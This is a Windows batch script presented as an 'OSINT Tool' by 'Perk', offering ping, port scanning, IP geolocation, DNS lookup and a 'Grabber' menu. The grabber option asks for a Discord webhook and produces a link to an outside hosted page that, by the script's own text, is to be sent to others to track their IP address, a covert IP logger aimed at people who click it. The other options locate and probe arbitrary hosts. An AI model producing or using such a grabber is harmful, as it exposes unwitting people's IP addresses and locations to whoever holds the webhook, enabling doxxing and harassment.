@echo off
chcp 65001 >nul
title OSINT Tool - by Perk

set "FIRST_RUN=1"

:banner
cls
echo.

if "%FIRST_RUN%"=="1" (
    color 05
    echo  ██▓███  ▓█████  ██▀███   ██ ▄█▀   ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
    timeout /nobreak /t 1 >nul
    color 0D
    echo  ▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒ ██▄█▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
    timeout /nobreak /t 1 >nul
    color 05
    echo  ▓██░ ██▓▒▒███   ▓██ ░▄█ ▒▓███▄░    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
    timeout /nobreak /t 1 >nul
    color 0D
    echo  ▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  ▓██ █▄    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
    timeout /nobreak /t 1 >nul
    color 05
    echo  ▒██▒ ░  ░░▒████▒░██▓ ▒██▒▒██▒ █▄     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
    timeout /nobreak /t 1 >nul
    color 0D
    echo  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
    timeout /nobreak /t 1 >nul
    color 05
    echo  ░▒ ░      ░ ░  ░  ░▒ ░ ▒░░ ░▒ ▒░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
    timeout /nobreak /t 1 >nul
    color 0D
    echo  ░░          ░     ░░   ░ ░ ░░ ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
    timeout /nobreak /t 1 >nul
    color 05
    echo              ░  ░   ░     ░  ░                   ░ ░      ░ ░      ░  ░
    echo.

    set "FIRST_RUN=0"
) else (
    color 05
    echo  ██▓███  ▓█████  ██▀███   ██ ▄█▀   ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
    echo  ▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒ ██▄█▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
    echo  ▓██░ ██▓▒▒███   ▓██ ░▄█ ▒▓███▄░    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
    echo  ▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  ▓██ █▄    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
    echo  ▒██▒ ░  ░░▒████▒░██▓ ▒██▒▒██▒ █▄     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
    echo  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
    echo  ░▒ ░      ░ ░  ░  ░▒ ░ ▒░░ ░▒ ▒░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
    echo  ░░          ░     ░░   ░ ░ ░░ ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
    echo              ░  ░   ░     ░  ░                   ░ ░      ░ ░      ░  ░
    echo.
)

goto menu

:menu
echo.
echo Choose an option:
echo (1) Pinger
echo (2) Our Discord
echo (3) Port Scanner
echo (4) Locate
echo (5) DNS Lookup
echo (6) Grabber
echo (7) Exit
set /p "option=Select an option: "

if "%option%"=="1" (
    call :pinger
) else if "%option%"=="2" (
    start "" "https://discord.gg/perkdc"
    pause
    goto banner
) else if "%option%"=="3" (
    call :port_scanner
) else if "%option%"=="4" (
    call :locate
) else if "%option%"=="5" (
    call :dns_lookup
) else if "%option%"=="6" (
    call :grabber
) else if "%option%"=="7" (
    exit /b
) else (
    echo Invalid option, please try again.
    goto menu
)

goto menu

:grabber
set /p "WEBHOOK_URL=Enter your webhook URL: "

REM Validate the webhook URL format (basic validation)
if not "%WEBHOOK_URL%"=="" (
    echo %WEBHOOK_URL% | findstr /C:"https://discord.com/api/webhooks/" >nul
    if errorlevel 1 (
        echo Invalid URL format. Please enter a valid webhook URL.
        echo Press any key to return to the menu...
        pause >nul
        goto menu
    )
) else (
    echo No URL entered. Please enter a valid webhook URL.
    echo Press any key to return to the menu...
    pause >nul
    goto menu
)

REM Construct the tracking link
set "TRACKING_LINK=http://perkstore.github.io/perk.lol/perkdc.html?webhook=%WEBHOOK_URL%"
echo Your tracking link: %TRACKING_LINK%
echo You can send this link to others to track their IP address.
echo.
echo Press any key to return to the menu...
pause >nul
goto menu
:pinger
set /p "IP_ADDRESS=Enter the IP address you want to ping: "
set "COUNT=4"

echo Pinging %IP_ADDRESS%...

ping -n %COUNT% %IP_ADDRESS%

if %errorlevel%==0 (
    echo %IP_ADDRESS% is online.
) else (
    echo %IP_ADDRESS% is offline.
)

echo.
pause
goto banner

:port_scanner
setlocal

set /p "IP_ADDRESS=Enter the IP address you want to check: "

ping -n 1 %IP_ADDRESS% >nul 2>&1
if errorlevel 1 (
    echo %IP_ADDRESS% is not reachable. Please check the IP and try again.
    echo.
    pause
    goto banner
)

echo Checking open ports on %IP_ADDRESS%...
python port_scanner.py %IP_ADDRESS%
echo.
pause
goto banner

:locate
set /p "IP_ADDRESS=Enter the IP address you want to locate: "

echo Locating %IP_ADDRESS%...

:: Use curl to fetch geolocation info directly
curl -s "https://ipinfo.io/%IP_ADDRESS%/json" > temp.json

if exist temp.json (
    for /f "delims=" %%A in (temp.json) do (
        echo %%A | findstr /C:"city" /C:"region" /C:"country" /C:"postal" /C:"timezone" > nul
        if not errorlevel 1 (
            echo %%A
        )
    )
) else (
    echo Unable to locate the IP address. Please check the IP and try again.
)

del temp.json
echo.
pause
goto banner

:dns_lookup
set /p "DOMAIN=Enter the domain name you want to look up: "

if "%DOMAIN%"=="" (
    echo No domain entered. Please try again.
    echo Press any key to return to the menu...
    pause >nul
    goto banner
)

echo Looking up DNS records for %DOMAIN%...
nslookup %DOMAIN%
echo.
echo Press any key to return to the menu...
pause >nul
goto banner